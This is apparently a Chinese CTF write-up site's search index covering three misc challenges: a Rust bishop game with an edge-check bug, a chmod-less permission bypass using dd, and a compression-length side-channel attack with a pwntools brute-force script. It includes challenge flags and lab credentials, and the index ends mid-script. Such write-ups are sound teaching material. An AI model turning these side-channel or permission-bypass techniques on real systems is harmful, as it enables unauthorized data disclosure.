\u5de6\u4e0b\u65b9\u5411\u6b63\u5e38\u53ef\u79fb\u52a8\u8303\u56f4\u5185\u7684\u683c\u5b50\u5c31\u6709\u4e94\u4e2a\u4e86\uff0c\u6240\u4ee5\u60f3\u8981\u5229\u7528\u5de6\u4e0b\u79fb\u52a8\u8df3\u5230\u53e6\u4e00\u79cd\u7c7b\u578b\u7684\u683c\u5b50\u662f\u4e0d\u53ef\u884c\u7684 \u2014v\u2014 \u79fb\u52a8\u5230\u540c\u4e00\u79cd\u7c7b\u578b\u7684\u683c\u5b50\u4e4b\u540e\uff0c\u518d\u73a9\u73a9\u6e38\u620f\u5c31\u80fd\u83b7\u5f97 Flag \u5566 \\(\u03a6\u03c9\u03a6 \u2261 \u03a6\u03c9\u03a6)/ Flag \u00b6 Goal 1 (first flag) sdctf{L0SiNG_y0uR_S0uRC3_C0d3_sUcKs} Goal 2 (second flag) sdctf{I_d1dnt_hAND_0u7_th3_s0urC3_c0D3_thIs_TIME}","title":"Bishop Duel"},{"location":"misc/bishop_duel/#_1","text":"2 bishops on the chessboard. Goal 1 (first flag) Lose the game by letting your bishop be captured. Goal 2 (second flag) Win by capturing the other bishop. Avoiding a draw is easy huh? But wait... Connect via nc bishop.sdc.tf 1337 main.rs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 use std :: io ::{ stdout , Write }; use std :: process :: exit ; use std :: thread :: sleep ; use std :: time :: Duration ; /* * Can you tell this was my first rust program ever? lmao */ use crossterm ::{ cursor , execute , queue , style , terminal ::{ Clear , EnterAlternateScreen , LeaveAlternateScreen }}; use crossterm :: terminal :: ClearType ; use rand ::{ rngs , SeedableRng }; use rand :: prelude :: SliceRandom ; use text_io :: read ; static TITLE_SCREEN : & str = \" o (^) -=H=- BISHOP DUEL ] [ -- press enter to start -- /___ \\\\ \" ; // having to double escape these backslashes makes this astoundingly ugly static BOARD : & str = \" \\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ Q# - up left # spaces \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\ E# - up right # spaces \\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ Z# - down left # spaces \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\ C# - down right # spaces \\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\ D - offer draw \\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ R - resign \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\\\\\\\\\\\\\ __ \\\\ \" ; enum Direction { UpLeft , UpRight , DownLeft , DownRight } struct Bishop { position : u16 } impl Bishop { fn get_xy ( & self ) -> ( u16 , u16 ) { let rows = self . position / 8 + 1 ; return (( self . position % 8 ) * 3 + rows , rows ); } fn move_position ( & mut self , dir : Direction , dist : u16 ) -> bool { let position_multiplier : i32 = match dir { Direction :: UpRight => - 7 , Direction :: DownLeft => 7 , Direction :: UpLeft => - 9 , Direction :: DownRight => 9 , }; let new_position = i32 :: from ( self . position ) + position_multiplier * i32 :: from ( dist ); // make sure we don't exceed the bottom and top of the chessboard if new_position < 0 || new_position > 64 { return false ; } // make sure we don't exceed the left and right edge of the chessboard match dir { Direction :: UpLeft | Direction :: DownLeft => { if self . position % 8 < dist { return false ; } } Direction :: UpRight | Direction :: DownRight => { if dist + self . position % 8 > 8 { return false ; } } } self . position = u16 :: try_from ( new_position ). unwrap (); return true ; } } fn pause ( msg : & str ) -> String { println! ( \"{}\" , msg ); read ! ( \"{} \\n \" ) } fn main () { let mut stdout = stdout (); let mut is_player_turn = true ; let mut white_bishop = Bishop { position : 5 }; let mut black_bishop = Bishop { position : 57 }; queue ! ( stdout , EnterAlternateScreen , Clear ( ClearType :: All ), style :: Print ( TITLE_SCREEN )). unwrap (); stdout . flush (). unwrap (); pause ( \"\" ); loop { let ( bb_x , bb_y ) = black_bishop . get_xy (); let ( ww_x , ww_y ) = white_bishop . get_xy (); queue ! ( stdout , Clear ( ClearType :: All ), cursor :: MoveTo ( 0 , 0 ), style :: Print ( BOARD ), cursor :: MoveTo ( bb_x , bb_y ), style :: Print ( \"BB\" ), cursor :: MoveTo ( ww_x , ww_y ), style :: Print ( \"WW\" ), cursor :: MoveTo ( 0 , 10 ) ). unwrap (); stdout . flush (). unwrap (); // this means SOMEBODY has been captured if white_bishop . position == black_bishop . position { if is_player_turn { pause ( \"You have been defeated! Your flag is REDACTED\" ); exit ( 0 ); } pause ( \"You have claimed victory! Your flag is REDACTED\" ); exit ( 0 ); } if is_player_turn { // if its the white bishop's turn execute ! ( stdout , style :: Print ( \"You are the white bishop. Input move > \" )). unwrap (); let command : String = read ! ( \"{} \\n \" ); let mut command_chars = command . chars (); if let Some ( c1 ) = command_chars . next () { match c1 { 'r' | 'R' => { pause ( \"A brave bishop shall never resign!\" ); }, 'd' | 'D' => { execute ! ( stdout , style :: Print ( \"The black bishop is thinking.\" )). unwrap (); sleep ( Duration :: from_millis ( 1000 )); execute ! ( stdout , style :: Print ( \".\" )). unwrap (); sleep ( Duration :: from_millis ( 1000 )); execute ! ( stdout , style :: Print ( \".\" )). unwrap (); sleep ( Duration :: from_millis ( 1000 )); pause ( \"Accepted! The game is a draw!\" ); break ; }, _ => { let direction : Direction = match c1 { 'e' | 'E' => Direction :: UpRight , 'z' | 'Z' => Direction :: DownLeft , 'q' | 'Q' => Direction :: UpLeft , 'c' | 'C' => Direction :: DownRight , _ => continue }; let distance = match command_chars . next () { None => continue , Some ( c2 ) => match c2 . to_digit ( 10 ) { None => continue , Some ( d ) => d as u16 } }; let successful = white_bishop . move_position ( direction , distance ); if successful { // now its the black bishop's turn is_player_turn = false ; } } } } } else { // black bishop's turn println! ( \"The black bishop is thinking...\" ); sleep ( Duration :: from_millis ( 1000 )); // get all black spaces and filter by currently accessible let curr = i32 :: from ( black_bishop . position ); let mut possible_positions = ( 0 .. 64 ). step_by ( 2 ) . map ( | i | if ( i / 8 ) % 2 == 0 { i } else { i + 1 }) . filter ( | i | ( curr - i ). abs () % 7 == 0 || ( curr - i ). abs () % 9 == 0 ). collect :: < Vec < i32 >> (); // if the white bishop is in our path, CRUSH THEM if possible_positions . contains ( & i32 :: from ( white_bishop . position )) { black_bishop . position = white_bishop . position ; is_player_turn = true ; continue ; } // otherwise, let's filter out moves that would put us in the path of the white bishop let white_curr = i32 :: from ( white_bishop . position ); if white_curr % 2 == 0 { possible_positions = possible_positions . into_iter () . filter ( | i | ( white_curr - i ) % 7 != 0 && ( white_curr - i ) % 9 != 0 ). collect :: < Vec < i32 >> (); } // otherwise, randomly select a new move let mut rng = rngs :: StdRng :: seed_from_u64 ( white_bishop . position as u64 ); let new_position = possible_positions . choose ( & mut rng ). unwrap (); black_bishop . position = u16 :: try_from ( * new_position ). unwrap (); // now its the white bishop's turn is_player_turn = true ; } } execute ! ( stdout , LeaveAlternateScreen ). unwrap (); }","title":"\u9898\u76ee"},{"location":"misc/bishop_duel/#_2","text":"\u4f7f\u7528 QEZC \u5728\u68cb\u76d8\u8303\u56f4\u5185\u79fb\u52a8\u65f6\uff0c\u7531\u4e8e\u8d70\u7684\u662f\u5bf9\u89d2\u7ebf\uff0c\u9ed1\u767d\u4e3b\u6559\u59cb\u7ec8\u5728\u5bf9\u5e94\u7c7b\u578b\uff08\u9ed1 / \u767d\uff09\u7684\u683c\u5b50\u5185\u79fb\u52a8\uff0c\u6ca1\u6709\u4ea4\u96c6 1 2 3 4 5 6 7 8 \\__\\\\\\\\__\\\\\\\\__\\WW\\__\\\\\\\\ Q# - up left # spaces \\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\ E# - up right # spaces \\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\ Z# - down left # spaces \\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\ C# - down right # spaces \\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\ \\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\ D - offer draw \\__\\\\\\\\__\\\\\\\\__\\\\\\\\__\\\\\\\\ R - resign \\\\\\\\BB\\\\\\\\__\\\\\\\\__\\\\\\\\__\\ \u60f3\u8981\u6293\u5230 black bishop \u6216\u8005\u88ab\u6293\u5230\uff0c\u9996\u5148\u8981\u79fb\u52a8\u5230\u540c\u4e00\u79cd\u7c7b\u578b\u7684\u683c\u5b50\u91cc \u90a3\u4e48\u5173\u952e\u70b9\u5c31\u662f\u51fd\u6570 move_position \u4e86\uff0c\u56e0\u4e3a\u79fb\u52a8\u5e76\u4e0d\u662f\u6309\u7167\u7c7b\u4f3c \\((x,y)\\) \u7684\u5750\u6807\u5f62\u5f0f\u3002\u5b9e\u9645\u4e0a\uff0c\u6bcf\u4e2a\u683c\u5b50\u7684\u4f4d\u7f6e\u76f8\u5f53\u4e8e\u6309\u7167\u5149\u6805\u626b\u63cf\u7684\u987a\u5e8f\u7f16\u53f7\uff0c\u6839\u636e \u5f53\u524d\u4f4d\u7f6e + \u5bf9\u5e94\u65b9\u5411\u7684\u7cfb\u6570 * \u79fb\u52a8\u683c\u6570 \u53d6\u5f97\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u5224\u65ad\u79fb\u52a8\u662f\u5426\u6709\u6548 \u65b0\u4f4d\u7f6e\u7684\u503c\u5e94\u5728 \\([0,64]\\) \u4e4b\u95f4 \u5982\u679c\u79fb\u52a8\u65b9\u5411\u4e3a\u5de6\u4e0a/\u5de6\u4e0b\uff0c\u90a3\u4e48\u79fb\u52a8\u683c\u6570\u4e0d\u5927\u4e8e\u5f53\u524d\u4f4d\u7f6e\u7684\u503c\u6a21 \\(8\\) \u5982\u679c\u79fb\u52a8\u65b9\u5411\u4e3a\u53f3\u4e0a/\u53f3\u4e0b\uff0c\u90a3\u4e48\u79fb\u52a8\u683c\u6570\u4e0e\u5f53\u524d\u4f4d\u7f6e\u503c\u6a21 \\(8\\) \u7684\u548c\u4e0d\u5927\u4e8e \\(8\\) \u4ee5\u521d\u59cb\u4f4d\u7f6e \\(5\\) \u4e3a\u4f8b\uff0c\u4e0a\u79fb\u4e00\u5b9a\u5bfc\u81f4\u4f4d\u7f6e\u503c\u5c0f\u4e8e \\(0\\) \uff0c\u6240\u4ee5\u53ea\u8003\u8651\u4e0b\u79fb \u53f3\u4e0b\u79fb\u52a8\u4e24\u683c\u4ee5\u5185\u663e\u7136\u662f\u53ef\u884c\u7684\uff0c\u4f46\u5982\u679c\u662f \\(3\\) \u683c\u5462\uff1f\u663e\u7136\u65b0\u4f4d\u7f6e\u7684\u503c\u4e0d\u4f1a\u8d85\u8fc7 \\(64(> 5+9\\times 3)\\) \uff0c\u800c \\(3+5 \\% 8\\) \u6070\u597d\u7b49\u4e8e \\(8\\) \uff0c\u6240\u4ee5\u53ef\u4ee5\u79fb\u52a8\uff0c\u5e76\u4e14\u4f1a\u8fdb\u5165 black_bishop \u7684\u79fb\u52a8\u8303\u56f4 \u03a6\u03c9\u03a6 \u5de6\u4e0b\u65b9\u5411\u6b63\u5e38\u53ef\u79fb\u52a8\u8303\u56f4\u5185\u7684\u683c\u5b50\u5c31\u6709\u4e94\u4e2a\u4e86\uff0c\u6240\u4ee5\u60f3\u8981\u5229\u7528\u5de6\u4e0b\u79fb\u52a8\u8df3\u5230\u53e6\u4e00\u79cd\u7c7b\u578b\u7684\u683c\u5b50\u662f\u4e0d\u53ef\u884c\u7684 \u2014v\u2014 \u79fb\u52a8\u5230\u540c\u4e00\u79cd\u7c7b\u578b\u7684\u683c\u5b50\u4e4b\u540e\uff0c\u518d\u73a9\u73a9\u6e38\u620f\u5c31\u80fd\u83b7\u5f97 Flag \u5566 \\(\u03a6\u03c9\u03a6 \u2261 \u03a6\u03c9\u03a6)/","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/bishop_duel/#flag","text":"Goal 1 (first flag) sdctf{L0SiNG_y0uR_S0uRC3_C0d3_sUcKs} Goal 2 (second flag) sdctf{I_d1dnt_hAND_0u7_th3_s0urC3_c0D3_thIs_TIME}","title":"Flag"},{"location":"misc/chm0d/","tags":["dd","chmod"],"text":"#dd #chmod .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Catch-22: a problematic situation for which the only solution is denied by a circumstance inherent in the problem. Credentials: user:password123 \u89e3\u9898\u601d\u8def \u00b6 flag.txt \u4f4d\u4e8e\u6839\u76ee\u5f55\u4e0b\uff0c\u4f46\u4e0d\u53ef\u8bfb 1 2 3 4 5 $ ls -l total 76 ... ---------- 1 user user 40 May 12 11 :44 flag.txt ... chmod \u547d\u4ee4\u4e0d\u53ef\u7528\uff0c\u4e14 user \u4e0d\u662f\u6240\u6709\u8005 1 2 $ ls /bin/chmod -l ---------- 1 root root 64448 Sep 24 2020 /bin/chmod \u53ef\u4ee5\u5728\u5bb6\u76ee\u5f55\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u518d\u7528\u539f\u59cb\u6587\u4ef6\u8986\u76d6\u5b83\uff0c\u8fd9\u6837\u80fd\u591f\u4fdd\u7559\u53ef\u8bfb\u6743\u9650 1 2 3 4 $ touch flag.txt $ dd if = /flag.txt of = flag.txt $ cat flag.txt Hero { chmod_1337_would_have_been_easier } \u53c2\u8003\u8d44\u6599 \u00b6 permissions - How to chmod without /usr/bin/chmod? - Unix & Linux Stack Exchange","title":"Chm0d"},{"location":"misc/chm0d/#_1","text":"Catch-22: a problematic situation for which the only solution is denied by a circumstance inherent in the problem. Credentials: user:password123","title":"\u9898\u76ee"},{"location":"misc/chm0d/#_2","text":"flag.txt \u4f4d\u4e8e\u6839\u76ee\u5f55\u4e0b\uff0c\u4f46\u4e0d\u53ef\u8bfb 1 2 3 4 5 $ ls -l total 76 ... ---------- 1 user user 40 May 12 11 :44 flag.txt ... chmod \u547d\u4ee4\u4e0d\u53ef\u7528\uff0c\u4e14 user \u4e0d\u662f\u6240\u6709\u8005 1 2 $ ls /bin/chmod -l ---------- 1 root root 64448 Sep 24 2020 /bin/chmod \u53ef\u4ee5\u5728\u5bb6\u76ee\u5f55\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u518d\u7528\u539f\u59cb\u6587\u4ef6\u8986\u76d6\u5b83\uff0c\u8fd9\u6837\u80fd\u591f\u4fdd\u7559\u53ef\u8bfb\u6743\u9650 1 2 3 4 $ touch flag.txt $ dd if = /flag.txt of = flag.txt $ cat flag.txt Hero { chmod_1337_would_have_been_easier }","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/chm0d/#_3","text":"permissions - How to chmod without /usr/bin/chmod? - Unix & Linux Stack Exchange","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/compress_the_flag/","text":"\u9898\u76ee \u00b6 Technically this isn't a good compression benchmark, but it's the only one we have. nc compresstheflag.hackable.software 1337 server.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 #!/usr/bin/env python3 import threading import socket import random import codecs import lzma as lz with open ( \"flag.txt\" , \"rb\" ) as f : FLAG = f . read () . strip () def none ( v ): return len ( v ) def zlib ( v ): return len ( codecs . encode ( v , \"zlib\" )) def bzip2 ( v ): return len ( codecs . encode ( v , \"bz2\" )) def lzma ( v ): return len ( lz . compress ( v )) COMPRESSION_FUNCS = [ none , zlib , bzip2 , lzma ] def handle_connection ( s , addr ): s . sendall ( ( \"Please send: seed:string \\\\ n \\n \" \"I'll then show you the compression benchmark results! \\n \" \"Note: Flag has format DrgnS{[A-Z]+} \\n \" ) . encode ()) data = b '' while True : idx = data . find ( b ' \\n ' ) if idx == - 1 : if len ( data ) > 128 : s . shutdown ( socket . SHUT_RDWR ) s . close () return d = s . recv ( 1024 ) if not d : s . close () return data += d continue line = data [: idx ] data = data [ idx + 1 :] seed , string = line . split ( b ':' , 1 ) flag = bytearray ( FLAG ) random . seed ( int ( seed )) random . shuffle ( flag ) print ( flag ) test_string = string + bytes ( flag ) response = [] for cfunc in COMPRESSION_FUNCS : res = cfunc ( test_string ) response . append ( f \" { cfunc . __name__ : >8 } { res : >4 } \" ) response . append ( '' ) response . append ( '' ) s . sendall ( ' \\n ' . join ( response ) . encode ()) s . shutdown ( socket . SHUT_RDWR ) s . close () def main (): with socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) as s : s . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) s . bind (( '0.0.0.0' , 1337 )) s . listen ( 256 ) while True : conn , addr = s . accept () print ( f \"Connection from: { addr } \" ) th = threading . Thread ( target = handle_connection , args = ( conn , addr ), daemon = True ) th . start () if __name__ == \"__main__\" : main () \u89e3\u9898\u601d\u8def \u00b6 \u63d0\u4f9b\u4e00\u4e2a\u968f\u673a\u6570\u79cd\u5b50\u548c\u5b57\u7b26\u4e32\uff0c\u670d\u52a1\u5668\u4f7f\u7528\u968f\u673a\u6570\u79cd\u5b50\u6253\u4e71 Flag \u5b57\u7b26\u7684\u987a\u5e8f\uff0c\u518d\u62fc\u63a5\u4e0a\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u6700\u540e\u751f\u6210\u5b57\u7b26\u4e32\u7684\u539f\u957f\u5ea6\u4ee5\u53ca\u4e0d\u540c\u538b\u7f29\u7b97\u6cd5\u538b\u7f29\u540e\u7684\u957f\u5ea6 1 2 3 4 5 6 7 8 Please send: seed:string \\n I ' ll then show you the compression benchmark results! Note: Flag has format DrgnS {[ A-Z ] + } 1 :A none 26 zlib 34 bzip2 63 lzma 84 none \u5373\u4e0d\u8fdb\u884c\u538b\u7f29\uff0c\u9664\u53bb\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u548c Flag \u5934\uff0c\u9700\u8981\u6c42\u89e3\u7684\u90e8\u5206\u7684\u957f\u5ea6\u4e3a \\(26 - 1 - 7 = 18\\) \u6307\u5b9a\u968f\u673a\u6570\u79cd\u5b50\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u77e5\u9053 Flag \u6253\u4e71\u4e4b\u540e\u6bcf\u4e00\u4e2a\u5b57\u7b26\u539f\u5148\u7684\u4f4d\u7f6e \u5148\u5728\u672c\u5730\u7528 DrgnS{ABCDEFGHIJKLMNOPQR} \u89c2\u5bdf\u4e00\u4e0b \u5f53\u79cd\u5b50\u4e3a 1 \u65f6\uff0c\u5b57\u6bcd E \u5f00\u5934 \u89c2\u5bdf\u53d1\u73b0\uff0c\u5f53\u8f93\u5165\u5b57\u7b26\u4e32\u4e3a 4 \u4e2a\u76f8\u540c\u5b57\u7b26\u65f6\uff0c EEEE \u548c\u6253\u4e71\u7684 Flag \u5b57\u7b26\u4e32\u4f7f\u7528 zlib \u548c bzip2 \uff08\u5747\u542b RLE \u548c Huffman \u7f16\u7801\uff09\u538b\u7f29\u7684\u957f\u5ea6\u4f1a\u5c0f\u4e8e\u5176\u4ed6\u5b57\u7b26 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1 :EEEE none 29 zlib 35 bzip2 69 lzma 88 1 :AAAA none 29 zlib 37 bzip2 70 lzma 88 1 :SSSS none 29 zlib 37 bzip2 70 lzma 88 \u5148\u627e\u5230\u4f7f\u6bcf\u4e2a\u5b57\u6bcd\u6253\u4e71\u540e\u4f5c\u4e3a\u5f00\u5934\u7684\u968f\u673a\u6570\u79cd\u5b50 1 2 3 4 5 6 7 8 9 10 11 12 import random flag_pos = b 'DrgnS {ABCTEFGHIJKLMNOPQR} ' # \u4e3a\u65b9\u4fbf\u67e5\u627e\uff0c\u6bcf\u4e2a\u5b57\u7b26\u5747\u4e0d\u76f8\u540c d = {} for i in range ( 10000 ): random . seed ( i ) tflag = bytearray ( flag_pos ) random . shuffle ( tflag ) if tflag [ 0 ] in b 'ABCTEFGHIJKLMNOPQR' and tflag [ 0 ] not in d : d [ tflag [ 0 ]] = i if len ( d ) == 18 : break \u968f\u540e\u7206\u7834\u6bcf\u4e00\u4e2a\u5b57\u6bcd\uff08\u6709\u4e00\u5b9a\u7684\u8fd0\u6c14\u6210\u5206\uff0c\u5982\u679c\u968f\u673a\u6570\u79cd\u5b50\u6ca1\u9009\u597d\uff0c\u5bfc\u81f4\u6253\u4e71\u7684 Flag \u5f00\u5934\u662f\u8fde\u7eed\u5b57\u6bcd\u5c31\u96be\u4ee5\u76f4\u63a5\u6839\u636e\u957f\u5ea6\u5224\u65ad\u4e86\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import pwn conn = pwn . remote ( \"compresstheflag.hackable.software\" , 1337 ) conn . recvline_contains ( 'Note' ) flag_pos = 'DrgnS {ABCTEFGHIJKLMNOPQR} ' flag = list ( 'DrgnS {xxxxxxxxxxxxxxxxxx} ' ) for k in d : min , mic = 0xffff , 'A' for c in range ( ord ( 'A' ), ord ( 'Z' ) + 1 ): conn . send ( f ' { d [ k ] } : { chr ( c ) * 4 } \\n ' ) l = int ( conn . recvline_contains ( 'zlib' ) . split ( b ' ' )[ - 1 ]) if l < min : min , mic = l , chr ( c ) flag [ flag_pos . find ( chr ( k ))] = mic print ( '' . join ( flag )) # DrgnS{THISISACRIMEIGUESS} \u53c2\u8003\u8d44\u6599 \u00b6 bzip2 - Wikipedia zlib - Wikipedia","title":"Compress The Flag"},{"location":"misc/compress_the_flag/#_1","text":"Technically this isn't a good compression benchmark, but it's the only one we have. nc compresstheflag.hackable.software 1337 server.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 #!/usr/bin/env python3 import threading import socket import random import codecs import lzma as lz with open ( \"flag.txt\" , \"rb\" ) as f : FLAG = f . read () . strip () def none ( v ): return len ( v ) def zlib ( v ): return len ( codecs . encode ( v , \"zlib\" )) def bzip2 ( v ): return len ( codecs . encode ( v , \"bz2\" )) def lzma ( v ): return len ( lz . compress ( v )) COMPRESSION_FUNCS = [ none , zlib , bzip2 , lzma ] def handle_connection ( s , addr ): s . sendall ( ( \"Please send: seed:string \\\\ n \\n \" \"I'll then show you the compression benchmark results! \\n \" \"Note: Flag has format DrgnS{[A-Z]+} \\n \" ) . encode ()) data = b '' while True : idx = data . find ( b ' \\n ' ) if idx == - 1 : if len ( data ) > 128 : s . shutdown ( socket . SHUT_RDWR ) s . close () return d = s . recv ( 1024 ) if not d : s . close () return data += d continue line = data [: idx ] data = data [ idx + 1 :] seed , string = line . split ( b ':' , 1 ) flag = bytearray ( FLAG ) random . seed ( int ( seed )) random . shuffle ( flag ) print ( flag ) test_string = string + bytes ( flag ) response = [] for cfunc in COMPRESSION_FUNCS : res = cfunc ( test_string ) response . append ( f \" { cfunc . __name__ : >8 } { res : >4 } \" ) response . append ( '' ) response . append ( '' ) s . sendall ( ' \\n ' . join ( response ) . encode ()) s . shutdown ( socket . SHUT_RDWR ) s . close () def main (): with socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) as s : s . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) s . bind (( '0.0.0.0' , 1337 )) s . listen ( 256 ) while True : conn , addr = s . accept () print ( f \"Connection from: { addr } \" ) th = threading . Thread ( target = handle_connection , args = ( conn , addr ), daemon = True ) th . start () if __name__ == \"__main__\" : main ()","title":"\u9898\u76ee"},{"location":"misc/compress_the_flag/#_2","text":"\u63d0\u4f9b\u4e00\u4e2a\u968f\u673a\u6570\u79cd\u5b50\u548c\u5b57\u7b26\u4e32\uff0c\u670d\u52a1\u5668\u4f7f\u7528\u968f\u673a\u6570\u79cd\u5b50\u6253\u4e71 Flag \u5b57\u7b26\u7684\u987a\u5e8f\uff0c\u518d\u62fc\u63a5\u4e0a\u63d0\u4f9b\u7684\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u6700\u540e\u751f\u6210\u5b57\u7b26\u4e32\u7684\u539f\u957f\u5ea6\u4ee5\u53ca\u4e0d\u540c\u538b\u7f29\u7b97\u6cd5\u538b\u7f29\u540e\u7684\u957f\u5ea6 1 2 3 4 5 6 7 8 Please send: seed:string \\n I ' ll then show you the compression benchmark results! Note: Flag has format DrgnS {[ A-Z ] + } 1 :A none 26 zlib 34 bzip2 63 lzma 84 none \u5373\u4e0d\u8fdb\u884c\u538b\u7f29\uff0c\u9664\u53bb\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u548c Flag \u5934\uff0c\u9700\u8981\u6c42\u89e3\u7684\u90e8\u5206\u7684\u957f\u5ea6\u4e3a \\(26 - 1 - 7 = 18\\) \u6307\u5b9a\u968f\u673a\u6570\u79cd\u5b50\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u77e5\u9053 Flag \u6253\u4e71\u4e4b\u540e\u6bcf\u4e00\u4e2a\u5b57\u7b26\u539f\u5148\u7684\u4f4d\u7f6e \u5148\u5728\u672c\u5730\u7528 DrgnS{ABCDEFGHIJKLMNOPQR} \u89c2\u5bdf\u4e00\u4e0b \u5f53\u79cd\u5b50\u4e3a 1 \u65f6\uff0c\u5b57\u6bcd E \u5f00\u5934 \u89c2\u5bdf\u53d1\u73b0\uff0c\u5f53\u8f93\u5165\u5b57\u7b26\u4e32\u4e3a 4 \u4e2a\u76f8\u540c\u5b57\u7b26\u65f6\uff0c EEEE \u548c\u6253\u4e71\u7684 Flag \u5b57\u7b26\u4e32\u4f7f\u7528 zlib \u548c bzip2 \uff08\u5747\u542b RLE \u548c Huffman \u7f16\u7801\uff09\u538b\u7f29\u7684\u957f\u5ea6\u4f1a\u5c0f\u4e8e\u5176\u4ed6\u5b57\u7b26 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 1 :EEEE none 29 zlib 35 bzip2 69 lzma 88 1 :AAAA none 29 zlib 37 bzip2 70 lzma 88 1 :SSSS none 29 zlib 37 bzip2 70 lzma 88 \u5148\u627e\u5230\u4f7f\u6bcf\u4e2a\u5b57\u6bcd\u6253\u4e71\u540e\u4f5c\u4e3a\u5f00\u5934\u7684\u968f\u673a\u6570\u79cd\u5b50 1 2 3 4 5 6 7 8 9 10 11 12 import random flag_pos = b 'DrgnS {ABCTEFGHIJKLMNOPQR} ' # \u4e3a\u65b9\u4fbf\u67e5\u627e\uff0c\u6bcf\u4e2a\u5b57\u7b26\u5747\u4e0d\u76f8\u540c d = {} for i in range ( 10000 ): random . seed ( i ) tflag = bytearray ( flag_pos ) random . shuffle ( tflag ) if tflag [ 0 ] in b 'ABCTEFGHIJKLMNOPQR' and tflag [ 0 ] not in d : d [ tflag [ 0 ]] = i if len ( d ) == 18 : break \u968f\u540e\u7206\u7834\u6bcf\u4e00\u4e2a\u5b57\u6bcd\uff08\u6709\u4e00\u5b9a\u7684\u8fd0\u6c14\u6210\u5206\uff0c\u5982\u679c\u968f\u673a\u6570\u79cd\u5b50\u6ca1\u9009\u597d\uff0c\u5bfc\u81f4\u6253\u4e71\u7684 Flag \u5f00\u5934\u662f\u8fde\u7eed\u5b57\u6bcd\u5c31\u96be\u4ee5\u76f4\u63a5\u6839\u636e\u957f\u5ea6\u5224\u65ad\u4e86\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import pwn conn = pwn . remote ( \"compresstheflag.hackable.software\" , 1337 ) conn . recvline_contains ( 'Note' ) flag_pos = 'DrgnS {ABCTEFGHIJKLMNOPQR} ' flag = list ( 'DrgnS {xxxxxxxxxxxxxxxxxx} ' ) for k in d : min , mic = 0xffff , 'A' for c in range ( ord ( 